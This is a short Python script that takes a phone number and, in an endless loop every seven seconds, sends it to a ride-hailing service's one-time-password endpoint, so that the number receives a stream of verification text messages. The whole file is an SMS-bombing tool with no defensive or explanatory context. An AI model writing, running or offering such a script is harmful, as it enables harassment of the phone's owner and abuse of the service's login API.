import requests
import time

enter = input("enter number : ")


while True:
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    number = {"cellphone":"+98"+enter}
    sms = requests.post(url,data=number)
    print(sms.status_code)
    time.sleep(7)
